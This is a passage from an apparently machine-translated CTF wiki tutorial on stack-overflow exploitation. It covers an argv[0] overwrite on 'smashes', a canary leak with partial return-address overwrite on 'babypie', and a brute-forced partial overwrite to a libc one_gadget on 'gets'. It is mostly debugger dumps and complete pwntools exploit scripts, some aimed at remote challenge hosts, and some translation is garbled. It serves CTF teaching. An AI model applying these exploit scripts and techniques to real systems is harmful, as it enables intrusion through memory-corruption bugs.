0x200665] # 0x600d40 <stdout> 0x4006db xi, oh 0x4006dd call 0x400660 <setbuf@plt> \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0x7fffffffdb78', 'l8'] 8 0x00007fffffffdb78\u2502+0x00: 0x00007ffff7a2d830 \u2192 <__libc_start_main+240> mov edi, eax \u2190 $rsp 0x00007fffffffdb80\u2502+0x08: 0x0000000000000000 0x00007fffffffdb88\u2502+0x10: 0x00007fffffffdc58 \u2192 0x00007fffffffe00b \u2192 \"/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/exam[...]\" 0x00007fffffffdb90\u2502+0x18: 0x0000000100000000 0x00007fffffffdb98\u2502+0x20: 0x00000000004006d0 \u2192 sub rsp, 0x8 0x00007fffffffdba0\u2502+0x28: 0x0000000000000000 0x00007fffffffdba8\u2502+0x30: 0x48c916d3cf726fe3 0x00007fffffffdbb0\u2502+0x38: 0x00000000004006ee \u2192 xor ebp, ebp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 [#0] 0x4006d0 \u2192 sub rsp, 0x8 [#1] 0x7ffff7a2d830 \u2192 Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdc48) ---Type <return> to continue, or q <return> to quit--- [# 2] 0x400717 \u2192 holds It can be seen that 0x00007fffffffe00b points to the program name, which is naturally argv[0], so the content we modified is this address. At the same time, the address is kept at 0x00007fffffffdc58, so the address we really need is 0x00007fffffffdc58. Also, according to the assembly code ` asm .text:00000000004007E0 push rbp .text:00000000004007E1 mov esi, offset aHelloWhatSYour ; \"Hello!\\nWhat's your name? \" .text:00000000004007E6 mov edi, 1 .text:00000000004007EB push rbx .text:00000000004007EC sub rsp, 118h .text:00000000004007F3 mov rax, fs:28h .text:00000000004007FC mov [rsp+128h+var_20], rax .text:0000000000400804 xor eax, eax .text:0000000000400806 call ___printf_chk .text:000000000040080B mov rdi, rsp .text:000000000040080E call __IO_gets We can make sure that the starting address of the string we read is actually the rsp before calling `__IO_gets`, so we put the breakpoint at the call, as follows `` `asm gef\u27a4 b *0x000000000040080E Breakpoint 2 at 0x40080e gef\u27a4 c Continuing. Hello! What's your name? Breakpoint 2, 0x000000000040080e in ?? () \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500 0x400804 xor eax, eax 0x400806 call 0x4006b0 <__printf_chk@plt> 0x40080b mov rdi, rsp \u2192 0x40080e call 0x4006c0 <_IO_gets@plt> \u21b3 0x4006c0 <_IO_gets@plt+0> jmp QWORD PTR [rip+0x20062a] # 0x600cf0 <_IO_gets@got.plt> 0x4006c6 <_IO_gets@plt+6> push 0x9 0x4006cb <_IO_gets@plt+11> jmp 0x400620 0x4006d0 sub rsp, 0x8 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0x7fffffffda40', 'l8'] 8 0x00007fffffffda40\u2502+0x00: 0x0000ff0000000000 \u2190 $rsp, $rdi 0x00007fffffffda48\u2502+0x08: 0x0000000000000000 0x00007fffffffda50\u2502+0x10: 0x0000000000000000 0x00007fffffffda58\u2502+0x18: 0x0000000000000000 0x00007fffffffda60\u2502+0x20: 0x0000000000000000 0x00007fffffffda68\u2502+0x28: 0x0000000000000000 0x00007fffffffda70\u2502+0x30: 0x0000000000000000 0x00007fffffffda78\u2502+0x38: 0x0000000000000000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 [#0] 0x40080e \u2192 call 0x4006c0 <_IO_gets@plt> \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 print $rsp $1 = (void *) 0x7fffffffda40 It can be seen that the value of rsp is 0x7fffffffda40, then the relative offset is >>> 0x00007fffffffdc58 - 0x7fffffffda40 536 >>> hex ( 536 ) '0x218' Using the program \u00b6 We construct the application as follows from pwn import * context . log_level = 'debug' smash = ELF ( './smashes' ) if args [ 'REMOTE' ]: sh = remote ( 'pwn.jarvisoj.com' , 9877 ) else : sh = process ( './smashes' ) argv_addr = 0x00007fffffffdc58 name_addr = 0x7fffffffda40 flag_addr = 0x600D20 another_flag_addr = 0x400d20 payload = 'a' * ( argv_addr - name_addr ) + p64 ( another_flag_addr ) sh . recvuntil ( 'name? ' ) sh . sendline ( payload ) sh . recvuntil ( 'flag: ' ) sh . sendline ( & #39;bb&#39;) data = sh . recv () sh . interactive () Here we get the flag directly, there is no online saying that the flag is not available. Title \u00b6 2018 Net Ding Cup - guess partial overwrite on the stack \u00b6 Partial overwrite This technique is applicable in many places. Here we use the partial overwrite on the stack as an example to introduce this idea. We know that after randomization (ASLR, PIE) is turned on, the lower 12-bit page offset is always fixed regardless of the high-order address, which means that if we can change the low-order offset, we can Control the execution flow of the program to some extent, bypassing PIE protection. 2018-\u5b89\u6052\u676f-babypie \u00b6 Taking the babypie of the Anheng Cup in July 2018 as an example, this kind of utilization technique is analyzed. The binary of the topic is placed in [ctf-challenge] ( https://github.com/ctf-wiki/ctf-challenges/tree/ Master/pwn/stackoverflow/partial_overwrite) Determining protection \u00b6 babypie: ELF 64 -bit LSB shared object, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 77a11dbd367716f44ca03a81e8253e14b6758ac3, stripped [ * ] '/home/m4x/pwn_repo/LinkCTF_2018.7_babypie/babypie' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 64-bit dynamically linked file with PIE protection and stack overflow protection enabled \u5206\u6790\u7a0b\u5e8f \u00b6 Looking at IDA, it is easy to find the vulnerability point. There are obvious stack overflow vulnerabilities in both inputs. It should be noted that before the input, the program clears the stack space, so we cannot pass the print stack. Information comes to the base of leak binary or libc __int64 sub_960 () { char buf [ 40 ]; // [rsp+0h] [rbp-30h] unsigned __int64 v2 ; // [rsp+28h] [rbp-8h] v2 = __readfsqword ( 0x28u ); setvbuf ( stdin , 0L L , 2 , 0L L ); setvbuf ( _bss_start , 0L L , 2 , 0L L ); * ( _ OWORD * ) buf = 0uLL ; * ( _ OWORD * ) & amp ; buf [ 16 ] = 0uLL ; puts ( \"Input your Name:\" ); read ( 0 , buf , 0x30uLL ); // overflow printf ( \"Hello %s: \\n \" , buf , * ( _QWORD * ) buf , * ( _QWORD * ) & buf [ 8 ], * ( _QWORD * ) & buf [ 16 ], * ( _QWORD * ) & buf [ 24 ]); read ( 0 , buf , 0x60uLL ); // overflow return 0L L ; } Also found that the program gives a function that can directly get the shell ` asm .text:0000000000000A3E getshell proc near .text:0000000000000A3E ; __unwind { .text:0000000000000A3E push rbp .text:0000000000000A3F mov rbp, rsp .text:0000000000000A42 lea rdi, command ; \"/bin/sh\" .text:0000000000000A49 call _system .text:0000000000000A4E nop .text:0000000000000A4F pop rbp .text: 0000000000000A50 retn .text:0000000000000A50 ; } // starts at A3E .text:0000000000000A50 getshell endp So we just have to control rip to this function. #### leak canary There is an output immediately after the first read, and read does not add \\0 to the end of the input, which gives us the opportunity to leak the contents of the stack. In order to control the return address for the second overflow, we choose leak canary. It can be calculated that the length of the first read is 0x30 - 0x8 + 1 (+ 1 is to cover the value of the lowest bit of canary is non-zero, printf uses % s, when the end of \\0 is encountered, when the canary low is over non-zero, canary can be printed by printf) `` `asm Breakpoint 1, 0x0000557c8443aa08 in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 RAX 0x0 RBX 0x0 RCX 0x7f1898a64690 (__read_nocancel+7) \u25c2\u2014 cmp rax, -0xfff RDX 0x30 RDI 0x557c8443ab15 \u25c2\u2014 insb byte ptr [rdi], dx /* 'Hello %s:\\n' */ RSI 0x7ffd97aa0410 \u25c2\u2014 0x6161616161616161 ('aaaaaaaa') R8 0x7f1898f1d700 \u25c2\u2014 0x7f1898f1d700 R9 0x7f1898f1d700 \u25c2\u2014 0x7f1898f1d700 R10 0x37b R11 0x246 R12 0x557c8443a830 \u25c2\u2014 xor ebp, ebp R13 0x7ffd97aa0540 \u25c2\u2014 0x1 R14 0x0 R15 0x0 RBP 0x7ffd97aa0440 \u2014\u25b8 0x7ffd97aa0460 \u2014\u25b8 0x557c8443aa80 \u25c2\u2014 push r15 RSP 0x7ffd97aa0410 \u25c2\u2014 0x6161616161616161 ('aaaaaaaa') RIP 0x557c8443aa08 \u25c2\u2014 call 0x557c8443a7e0 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500 [DISASM] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500 \u25ba 0x557c8443aa08 call 0x557c8443a7e0 0x557c8443aa0d lea rax, [rbp - 0x30] 0x557c8443aa11 mov edx, 0x60 0x557c8443aa16 mov rsi, rax 0x557c8443aa19 mov edi, 0 0x557c8443aa1e call 0x557c8443a7f0 0x557c8443aa23 mov eax, 0 0x557c8443aa28 mov rcx, qword ptr [rbp - 8] 0x557c8443aa2c xor rcx, qword ptr fs:[0x28] 0x557c8443aa35 je 0x557c8443aa3c 0x557c8443aa37 call 0x557c8443a7c0 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 00:0000\u2502 rsi rsp 0x7ffd97aa0410 \u25c2\u2014 0x6161616161616161 ('aaaaaaaa') ... \u2193 05:0028\u2502 0x7ffd97aa0438 \u25c2\u2014 0xb3012605fc402a61 06:0030\u2502 rbp 0x7ffd97aa0440 \u2014\u25b8 0x7ffd97aa0460 \u2014\u25b8 0x557c8443aa80 \u25c2\u2014 push r15 07:0038\u2502 0x7ffd97aa0448 \u2014\u25b8 0x557c8443aa6a \u25c2\u2014 mov eax, 0 Breakpoint *(0x557c8443a000+0xA08) pwndbg> canary $1 = 0 canary : 0xb3012605fc402a00 pwndbg&gt; Canary In the rbp - 0x8 position, it can be seen that the lower bit of the canary has been overwritten to 0x61, so as long as the 7 bits after 'a' * (0x30 - 0x8 + 1) are received, plus the lowest bit ' 0', we will recover the canary of the program. Override return address \u00b6 With canary, you can overwrite the return address with the second stack overflow, and control the return address to the getshell function. Let's first look at the return address when there is no overflow. ` asm 0x000055dc43694a1e in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 RAX 0x7fff9aa3af20 \u25c2\u2014 0x6161616161616161 ('aaaaaaaa') RBX 0x0 RCX 0x7f206c6696f0 (__write_nocancel+7) \u25c2\u2014 cmp rax, -0xfff RDX 0x60 RDI 0x0 RSI 0x7fff9aa3af20 \u25c2\u2014 0x6161616161616161 ('aaaaaaaa') R8 0x7f206cb22700 \u25c2\u2014 0x7f206cb22700 R9 0x3e R10 0x73 R11 0x246 R12 0x55dc43694830 \u25c2\u2014 xor ebp, ebp R13 0x7fff9aa3b050 \u25c2\u2014 0x1 R14 0x0 R15 0x0 RBP 0x7fff9aa3af50 \u2014\u25b8 0x7fff9aa3af70 \u2014\u25b8 0x55dc43694a80 \u25c2\u2014 push r15 RSP 0x7fff9aa3af20 \u25c2\u2014 0x6161616161616161 ('aaaaaaaa') RIP 0x55dc43694a1e \u25c2\u2014 call 0x55dc436947f0 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500 [DISASM] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500 0x55dc43694a08 call 0x55dc436947e0 0x55dc43694a0d lea rax, [rbp - 0x30] 0x55dc43694a11 mov edx, 0x60 0x55dc43694a16 mov rsi, rax 0x55dc43694a19 mov edi, 0 \u25ba 0x55dc43694a1e call 0x55dc436947f0 0x55dc43694a23 mov eax, 0 0x55dc43694a28 mov rcx, qword ptr [rbp - 8] 0x55dc43694a2c xor rcx, qword ptr fs:[0x28] 0x55dc43694a35 je 0x55dc43694a3c 0x55dc43694a37 call 0x55dc436947c0 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 00:0000\u2502 rax rsi rsp 0x7fff9aa3af20 \u25c2\u2014 0x6161616161616161 ('aaaaaaaa') ... \u2193 05:0028\u2502 0x7fff9aa3af48 \u25c2\u2014 0xbfe0cfbabccd2861 06:0030\u2502 rbp 0x7fff9aa3af50 \u2014\u25b8 0x7fff9aa3af70 \u2014\u25b8 0x55dc43694a80 \u25c2\u2014 push r15 07:0038\u2502 0x7fff9aa3af58 \u2014\u25b8 0x55dc43694a6a \u25c2\u2014 mov eax, 0 pwndbg> x/10i (0x0A3E+0x55dc43694000) 0x55dc43694a3e: push rbp 0x55dc43694a3f: mov rbp,rsp 0x55dc43694a42: lea rdi,[rip+0xd7] # 0x55dc43694b20 0x55dc43694a49: call 0x55dc436947d0 0x55dc43694a4e: nop 0x55dc43694a4f: pop rbp 0x55dc43694a50: right 0x55dc43694a51: push rbp 0x55dc43694a52: mov rbp,rsp 0x55dc43694a55: sub rsp,0x10 It can be found that the return address at this time is different from the 16 bits of the address of the get shell function. If the lower 16 bits are set to `0x?A3E`, there is a certain probability of getting shell. The final script is as follows: ```python #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * # context.log_level = \"debug\" context.terminal = [\"deepin-terminal\", \"-x\", \"sh\", \"-c\"] while True: try: io = process(\"./babypie\", timeout = 1) # gdb.attach (I) io.sendafter(\":\\n\", 'a' * (0x30 - 0x8 + 1)) io.recvuntil (&#39;a&#39; * (0x30 - 0x8 + 1)) canary = &#39;0&#39; + io.recvn (7) success(canary.encode('hex')) # gdb.attach (I) io.sendafter(\":\\n\", 'a' * (0x30 - 0x8) + canary + 'bbbbbbbb' + '\\x3E\\x0A') io.interactive () except Exception as e: io.close () print e It should be noted that this technique is not only effective on the stack, but also an effective means of bypassing address randomization on the heap. 2018-XNUCA-gets \u00b6 This topic is also very interesting, as follows __int64 __fastcall main ( __int64 a1 , char ** a2 , char ** a3 ) { char * v4 ; // [rsp + 0h] [rbp-18h] gets (( char * ) & amp ; v4 ); return 0L L ; } The program is so small that there is obviously a stack overflow vulnerability, but there is no leak. . Determining protection \u00b6 First take a look at the protection of the program [ * ] ' / mnt / hgfs / CTF / 2018 / 1124 XNUCA / pwn / gets / gets ' Arch : amd64 -64 - little RELRO : Full RELRO Stack : No canary found NX : NX enabled PIE : No PIE ( 0x400000 ) It is better that the program does not have a canary. Naturally, we can easily control the EIP of the program, but it is a problem to control where. Analysis \u00b6 We know the basic execution flow of the program through the basic execution flow (executable part) of ELF. At the same time, we find that there are two function return addresses on the stack. ` asm pwndbg> stack 25 00:0000\u2502 rsp 0x7fffffffe398 \u2014\u25b8 0x7ffff7a2d830 (__libc_start_main+240) \u25c2\u2014 mov edi, eax 01:0008\u2502 0x7fffffffe3a0 \u25c2\u2014 0x1 02:0010\u2502 0x7fffffffe3a8 \u2014\u25b8 0x7fffffffe478 \u2014\u25b8 0x7fffffffe6d9 \u25c2\u2014 0x6667682f746e6d2f ('/mnt/hgf') 03:0018\u2502 0x7fffffffe3b0 \u25c2\u2014 0x1f7ffcca0 04:0020\u2502 0x7fffffffe3b8 \u2014\u25b8 0x400420 \u25c2\u2014 sub rsp, 0x18 05:0028\u2502 0x7fffffffe3c0 \u25c2\u2014 0x0 06:0030\u2502 0x7fffffffe3c8 \u25c2\u2014 0xf086047f3fb49558 07:0038\u2502 0x7fffffffe3d0 \u2014\u25b8 0x400440 \u25c2\u2014 xor ebp, ebp 08:0040\u2502 0x7fffffffe3d8 \u2014\u25b8 0x7fffffffe470 \u25c2\u2014 0x1 09:0048\u2502 0x7fffffffe3e0 \u25c2\u2014 0x0 ... \u2193 0b:0058\u2502 0x7fffffffe3f0 \u25c2\u2014 0xf79fb00f2749558 0c:0060\u2502 0x7fffffffe3f8 \u25c2\u2014 0xf79ebba9ae49558 0d:0068\u2502 0x7fffffffe400 \u25c2\u2014 0x0 ... \u2193 10: 0080\u2502 0x7fffffffe418 \u2014\u25b8 0x7fffffffe488 \u2014\u25b8 0x7fffffffe704 \u25c2\u2014 0x504d554a4f545541 ('AUTOMOTIVE') 11:0088\u2502 0x7fffffffe420 \u2014\u25b8 0x7ffff7ffe168 \u25c2\u2014 0x0 12:0090\u2502 0x7fffffffe428 \u2014\u25b8 0x7ffff7de77cb (_dl_init+139) \u25c2\u2014 jmp 0x7ffff7de77a0 Where `__libc_start_main+240` is in libc and `_dl_init+139` is in ld 0x7ffff7a0d000 0x7ffff7bcd000 r-xp 1c0000 0 /lib/x86_64-linux-gnu/libc-2.23.so 0x7ffff7bcd000 0x7ffff7dcd000 ---p 200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so 0x7ffff7dcd000 0x7ffff7dd1000 r--p 4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so 0x7ffff7dd1000 0x7ffff7dd3000 rw-p 2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so 0x7ffff7dd3000 0x7ffff7dd7000 rw-p 4000 0 0x7ffff7dd7000 0x7ffff7dfd000 r-xp 26000 0 /lib/x86_64-linux-gnu/ld-2.23.so A more natural idea is that we use partial overwrite to modify these two addresses to a location that gets the shell, which is naturally a Onegadget. So which one do we cover? ? Let&#39;s first analyze the base address `0x7ffff7a0d000` of `libc`. We generally want to cover the bytes, at least 1 nibble to be able to get jumped to onegadget. However, when the program reads it, it is read by `gets`, which means that `\\x00` will definitely exist at the end of the string. When we cover the bytes, we must cover the integer multiples, that is, we will cover at least 3 bytes, and let&#39;s take a look at the address `0x7ffff7a2d830` of `__libc_start_main+240`. If it covers 3 bytes, it is `0x7ffff700xxxx `, has been less than the base address of libc, there is no code position deliberately executed before. In general, the offset of libc_start_main in libc is not too bad, so obviously if we overwrite `__libc_start_main+240`, it is obviously impossible. And the base address of ld? If we overwrite `_dl_init+139` on the stack, it is `0x7ffff700xxxx`. Looking at the above memory layout, we can find that `libc` is in the low address direction of `ld`, so when randomizing, it is very likely that the third byte of libc is `\\x00`. For example, the current offset between the two is 0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000 Then if ld is loaded to `0x7ffff73ca000`, then the starting address of `libc` is obviously `0x7ffff7000000`. Therefore, we have a good reason to choose to overwrite the `_dl_init+139` stored on the stack. So what is it covered? Still don&#39;t know. Because we don&#39;t know what the library version of libc is, We can cover the coverage first and see if the program will crash. After all, it is very likely that the code in the libc library will be executed. ```python from pwn import * context.terminal = ['tmux', 'split', '-h'] #context.terminal = ['gnome-terminal', '-x', 'sh', '-c'] if args['DEBUG']: context.log_level = 'debug' elfpath = './gets' context.binary = elfpath elf = ELF (elf path) bits = elf.bits def exp(ip, port): for i in range(0x1000): if args['REMOTE']: p = remote(ip, port) else: p = process(elfpath, timeout=2) # gdb.attach(p) try: payload = 0x18 * 'a' + p64(0x40059B) for _ in range(2): payload += 'a' * 8 * 5 + p64(0x40059B) payload += 'a' * 8 * 5 + p16(i) p.sendline(payload) data = p.recv() print data p.interactive() p.close() except Exception: p.close() continue if __name__ == \"__main__\": exp('106.75.4.189', 35273) Finally, we found the following error. On the one hand, we can judge that this is definitely the 2.23 version of libc; on the other hand, we can finally locate the version of libc by (cfree+0x4c)[0x7f57b6f9253c] . ======= Backtrace: ========= /lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f57b6f857e5] /lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7f57b6f8e37a] /lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7f57b6f9253c] /lib/x86_64-linux-gnu/libc.so.6(+0xf2c40)[0x7f57b7000c40] [0x7ffdec480f20] ======= Memory map: ======== 00400000-00401000 r-xp 00000000 00:28 48745 /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets 00600000-00601000 r--p 00000000 00:28 48745 /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets 00601000-00602000 rw-p 00001000 00:28 48745 /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets 00b21000-00b43000 rw-p 00000000 00:00 0 [heap] 7f57b0000000-7f57b0021000 rw-p 00000000 00:00 0 7f57b0021000-7f57b4000000 ---p 00000000 00:00 0 7f57b6cf8000-7f57b6d0e000 r-xp 00000000 08:01 914447 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f57b6d0e000-7f57b6f0d000 ---p 00016000 08:01 914447 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f57b6f0d000-7f57b6f0e000 rw-p 00015000 08:01 914447 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f57b6f0e000-7f57b70ce000 r-xp 00000000 08:01 914421 /lib/x86_64-linux-gnu/libc-2.23.so 7f57b70ce000-7f57b72ce000 ---p 001c0000 08:01 914421 /lib/x86_64-linux-gnu/libc-2.23.so 7f57b72ce000-7f57b72d2000 r--p 001c0000 08:01 914421 /lib/x86_64-linux-gnu/libc-2.23.so 7f57b72d2000-7f57b72d4000 rw-p 001c4000 08:01 914421 /lib/x86_64-linux-gnu/libc-2.23.so 7f57b72d4000-7f57b72d8000 rw-p 00000000 00:00 0 7f57b72d8000-7f57b72fe000 r-xp 00000000 08:01 914397 /lib/x86_64-linux-gnu/ld-2.23.so 7f57b74ec000-7f57b74ef000 rw-p 00000000 00:00 0 7f57b74fc000-7f57b74fd000 rw-p 00000000 00:00 0 7f57b74fd000-7f57b74fe000 r--p 00025000 08:01 914397 /lib/x86_64-linux-gnu/ld-2.23.so 7f57b74fe000-7f57b74ff000 rw-p 00026000 08:01 914397 /lib/x86_64-linux-gnu/ld-2.23.so 7f57b74ff000-7f57b7500000 rw-p 00000000 00:00 0 7ffdec460000-7ffdec481000 rw-p 00000000 00:00 0 [stack] 7ffdec57f000-7ffdec582000 r--p 00000000 00:00 0 [vvar] 7ffdec582000-7ffdec584000 r-xp 00000000 00:00 0 [vdso] ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall] After determining the version of libc, we can choose one_gadget, here I choose the first one, the lower address. \u279c gets one_gadget /lib/x86_64-linux-gnu/libc.so.6 0x45216 execve ( \"/bin/sh\" , rsp+0x30, environ ) constraints: rax == NULL 0x4526a execve ( \"/bin/sh\" , rsp+0x30, environ ) constraints: [ rsp+0x30 ] == NULL 0xf02a4 execve ( \"/bin/sh\" , rsp+0x50, environ ) constraints: [ rsp+0x50 ] == NULL 0xf1147 execve ( \"/bin/sh\" , rsp+0x70, environ ) constraints: [ rsp+0x70 ] == NULL Continue to blast with the following exp, from pwn import * context . terminal = [ 'tmux' , 'split' , '-h' ] #context.terminal = ['gnome-terminal', '-x', 'sh', '-c'] if args [ 'DEBUG' ]: context . log_level = 'debug' elfpath = './gets' context . binary = elfpath elf = ELF ( elf path ) bits = elf . bits def exp ( ip , port ): for i in range ( 0x1000 ): if args [ 'REMOTE' ]: p = remote ( ip , port ) else : p = process ( elfpath , timeout = 2 ) # gdb.attach(p) try : payload = 0x18 * 'a' + p64 ( 0x40059B ) for _ in range ( 2 ): payload += 'a' * 8 * 5 + p64 ( 0x40059B ) payload += 'a' * 8 * 5 + ' \\x16\\02 ' p . sendline ( payload ) p . sendline ( & #39;ls&#39;) data = p . recv () print data p . interactive () p . close () except Exception : p . close () continue if __name__ == \"__main__\" : exp ( '106.75.4.189' , 35273 ) Finally get the shell. $ ls exp . py gets Title 